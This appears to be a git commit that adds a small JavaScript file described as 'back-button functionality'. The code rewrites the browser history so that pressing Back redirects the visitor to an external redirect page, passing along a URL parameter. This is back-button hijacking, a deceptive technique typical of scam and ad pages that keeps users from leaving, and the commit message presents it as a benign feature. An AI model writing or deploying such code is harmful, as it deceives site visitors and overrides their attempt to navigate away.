83da18980bf6cd28118803af7da921804527ec00
MD ZAHIRUL ISLAM <41184512+iamSH4NTO@users.noreply.github.com>
2025-11-22 01:06:44 +0600

    Add back-button functionality with redirect logic

---
+++ agrs6lp/back-button.js
@@ -0,0 +1,23 @@
+    (function(window, location) {
+        let bbCURL = new URL(window.location.href);
+        let v1Param = bbCURL.searchParams.get("v1");
+        var redirect = "https://example.com/redirect/index.php?v1=" + v1Param +
+            "&v2=T&T";
+        var currentUrl = location.origin + location.pathname + location.search;
+        if (location.hash !== "#!/hst") {
+            history.replaceState(null, document.title, currentUrl + "#!/hst");
+            history.pushState(null, document.title, currentUrl);
+        }
+ 
+        window.addEventListener(
+            "popstate",
+            function() {
+                if (location.hash === "#!/hst") {
+                    setTimeout(function() {
+                        window.location.replace(redirect);
+                    }, 0);
+                }
+            },
+            false
+        );
+    })(window, location);
